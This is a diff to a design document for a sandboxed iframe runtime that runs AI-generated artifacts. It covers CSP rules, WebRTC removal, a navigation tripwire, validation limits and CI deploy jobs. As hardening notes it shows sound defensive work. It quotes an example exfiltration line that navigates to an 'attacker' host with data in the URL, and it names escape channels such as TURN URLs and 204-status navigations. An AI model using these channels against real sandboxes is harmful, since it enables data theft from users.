@@ -39,32 +39,50 @@ protocol v2 live next to v1.
    script-src 'self' 'unsafe-inline' blob:; style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:; font-src 'self' data:; media-src data: blob:;
    connect-src 'none'; form-action 'none'; frame-src 'none';
-   worker-src blob:; base-uri 'none';
+   base-uri 'none'; webrtc 'block';
    frame-ancestors https://besidka.com https://*.chernenko.workers.dev
    ```
 
    There is no third-party host in it. `'unsafe-eval'` is not needed: Sucrase
    emits text that is loaded as a module from a `blob:` URL, and Mermaid
-   renders without `eval` (both verified in Chromium and WebKit).
+   renders without `eval` (both verified in Chromium and WebKit). There is
+   no `worker-src`, so `default-src 'none'` blocks workers. `webrtc 'block'`
+   is not enforced by Chromium or WebKit today (tested); it stays for the
+   engines that will enforce it.
 3. **Only the MessagePort is trusted.** `event.origin` is `"null"` for every
    opaque frame, so it cannot identify anyone. The host hands the runtime a
    `MessageChannel` port on the iframe's first `load`; the runtime accepts the
    first `besidka/connect` whose `event.source === window.parent` and that
    carries exactly one port, then removes its `message` listener. Everything
    else on the window is ignored.
-4. **No network from the frame.** `connect-src 'none'` and the image, font
-   and media sources block every request to other hosts. The parent is the
-   only network path; storage and AI completions are host requests.
-5. **Navigation tripwire.** The CSP cannot stop a frame from navigating itself
-   (`location.href = 'https://attacker/?d=…'`); the `navigate-to` directive
-   that once covered this does not exist. `createHostConnection` treats every
-   `load` after the first as the frame having left the runtime: it closes the
-   port, removes the iframe and calls `onUnexpectedNavigation`. **The URL of
-   that navigation, and whatever the new page sends while it loads, have
-   already left the browser by then** (the e2e spec records it). Never write
-   that the frame "cannot send data out" or that credential collection is
-   impossible: this is a tripwire that limits the damage, and the residual
-   risk belongs in the DPIA (A-9).
+4. **No requests from the frame's own APIs.** `connect-src 'none'` and the
+   image, font and media sources block fetch, XHR, beacons, images, fonts and
+   media to other hosts, and storage and AI completions are host requests.
+   CSP does not govern WebRTC: a TURN server URL reached the outside host in
+   both engines, so the runtime removes `RTCPeerConnection` and its
+   relatives from the window before any artifact code runs (`src/webrtc.ts`);
+   a child frame cannot be used to get a fresh copy (`SecurityError` in both
+   engines). DNS prefetch and preconnect hints were not tested. Navigation is
+   the remaining channel (next item).
+5. **Navigation.** The runtime's own CSP cannot stop the frame from
+   navigating itself (`location.href = 'https://attacker/?d=…'`); the
+   `navigate-to` directive that once covered this does not exist. Two layers:
+   - **`frame-src` on the embedding page (required for A-4).** A page that
+     embeds artifacts must send `Content-Security-Policy: frame-src
+     <artifactsOrigin>`. The e2e spec shows that this blocks the
+     self-navigation before its request leaves, in Chromium and WebKit; the
+     blocked frame then loads an error page, which trips the wire below.
+     It also covers targets that never fire `load` (a `204` response, a
+     download, a `load` held open) and `data:` or `blob:` documents.
+   - **Tripwire.** `createHostConnection` treats every `load` after the first
+     as the frame having left the runtime: it closes the port, removes the
+     iframe and calls `onUnexpectedNavigation`.
+   **Without the `frame-src` policy the URL of the navigation, and whatever
+   the new page sends while it loads, leave the browser before the tripwire
+   fires; a navigation to a `204` target sends its URL and fires no `load`
+   at all** (both recorded by the e2e spec). Never write that the frame
+   "cannot send data out" or that credential collection is impossible; the
+   residual risk belongs in the DPIA (A-9).
 
 Top navigation (`window.top.location = …`) is blocked by the sandbox.
 
@@ -86,6 +104,14 @@ Consequences: an artifact that calls `document.write()` after load replaces
 the document and trips the wire (A-3 tells models not to), and timers or
 listeners from a previous version of an HTML artifact keep running after a
 re-render, so the host should mount a fresh frame when it switches versions.
+Classic scripts run in order (external ones are awaited), inline module
+scripts are loaded from `blob:` URLs so their `load` event can be awaited
+(up to 5 s each) before the synthetic events, and `meta[http-equiv]`
+(a `refresh` would navigate the frame) and `noscript` (its content would
+become live, since `DOMParser` parses with scripting off) are removed. The
+SVG and Markdown renderers parse through a `<template>` and drop the same
+elements. Links (`<a href>`, SVG `xlink:href`, `<area>`) are intercepted so a
+click never navigates the frame.
 
 Streaming (`tool-input-partial`) renders Markdown live and shows the other
 kinds as a text preview of the latest lines; partial code never runs.
@@ -160,12 +186,31 @@ memory and rejects `complete()` with "AI completions are not available here".
 
 The host validates every param from the runtime before calling a handler
 (sizes, URLs, storage keys and JSON values, prompt length) and never returns
-internal error details. Treat all port traffic as untrusted: it comes from
+internal error details. Guards bound what the runtime can send: frame
+height at most 100,000 px, `maxOutputTokens` at most 2,000, prompts at
+most 8,000 characters, storage keys without control characters or the
+names `__proto__`, `constructor` and `prototype`, storage values at most
+about 100 KB, 10,000 nodes and depth 32 (walked once per object, so shared
+references cannot make validation exponential), links only `http(s)`
+without user info or control and bidi characters, passed to `onOpenLink`
+normalised. At most 16 runtime requests are in flight; more are refused
+with `-32012`, and a second `ui/initialize` or another protocol version is
+refused. Treat all port traffic as untrusted, every field artifact-authored
+(artifact code shares the runtime's realm and can reach the port): it comes
+from
 the artifact's own frame.
 
-`createHostConnection(iframe, handlers, options)` must be called in the same
-task that sets the iframe `src`, before the first `load`. It queues
-notifications until the runtime sends `initialized`.
+Mount order for A-4: create the iframe with `src` already set, call
+`createHostConnection(iframe, handlers, options)`, then insert the iframe, in
+one task, and never move it in the DOM (Teleport, KeepAlive or a re-parent
+reloads it and trips the wire); mount a fresh frame per version and display
+mode. Notifications are coalesced until the runtime is ready (the latest
+result wins over partials, context changes merge), and
+`onConnectTimeout` fires when the runtime is not ready 15 s after the first
+`load` (wrong origin, `frame-ancestors` mismatch, protocol skew). The host
+must still clamp `size-changed` to its layout and render `notifications/message`
+text as plain text only.
+
 
 `window.besidka` (frozen): `storage.get/set/delete/list`,
 `storage.persistent`, `complete(prompt, { maxOutputTokens })`, `theme`,
@@ -195,8 +240,10 @@ the main suite's server does not run the runtime. Covered: CSP and opaque
 origin, blocked fetch/image/cookie/localStorage/top navigation, forged and
 second connects ignored, all five kinds, streaming preview, unknown import
 with no request, size and error notifications, theme switch without reload,
-links through the host, the navigation tripwire, storage and completion
-fallbacks, and TSX transpile time.
+links through the host, the navigation tripwire, the host `frame-src`
+policy blocking self-navigation before any request, WebRTC removed, the
+`204` navigation residual, storage and completion fallbacks, and TSX
+transpile time.
 
 ## CI and deployment
 
@@ -205,7 +252,8 @@ Both deploy paths are **guarded by the repository variable
 runtime anywhere.
 
 - **PRs (`preview-build.yml`, job `artifacts-runtime`)**: when a PR changes
-  `workers/`, `packages/`, `tests/e2e-artifacts/` or the Playwright config,
+  `workers/`, `packages/`, `tests/e2e-artifacts/`, the Playwright config,
+  `pnpm-lock.yaml` or `pnpm-workspace.yaml`,
   the job builds the runtime with production headers (licence scan), uploads
   `preview-artifacts-runtime`, installs Chromium and WebKit and runs the
   sandbox spec. This needs no Cloudflare access.
@@ -215,13 +263,21 @@ runtime anywhere.
   when the PR changes the runtime or the protocol, and `preview-deploy.yml`
   uploads `wrangler preview --name pr-<n>` of the runtime with the default
   branch's `wrangler.jsonc` (skipped on the bootstrap PR, which has none on
-  `main`). `preview-cleanup.yml` deletes it on close. The preview host does
+  `main`). The PR's `_headers` and any `_redirects` are replaced by headers
+  generated from the default branch's `headers.mjs` before upload, and a
+  failure there does not fail the app preview. `preview-cleanup.yml` deletes
+  the runtime preview on close (not gated by the variable, a missing preview
+  is fine). The preview host does
   not match the auth wildcard `*-besidka.chernenko.workers.dev`.
 - **Production (`production.yml`, job `deploy-satellites`)**: on `main`, after
-  the tests pass and only when `workers/artifacts-runtime/` or
-  `packages/artifacts-protocol/` changed in the push, it builds and runs
+  the tests pass and only when `workers/artifacts-runtime/`,
+  `packages/artifacts-protocol/`, `pnpm-lock.yaml` or `pnpm-workspace.yaml`
+  changed in the push (or on `workflow_dispatch`), it builds and runs
   `wrangler deploy` for `besidka-artifacts` (concurrency group per Worker).
-  `deploy` needs it and still runs when it is skipped.
+  `deploy` needs it and still runs when it is skipped. The change check
+  compares only with the previous push, so a runtime change whose production
+  run failed or was cancelled is not redeployed by the next push: re-run the
+  failed run or start the workflow by hand.
 
 ### Owner steps before the first deploy
 
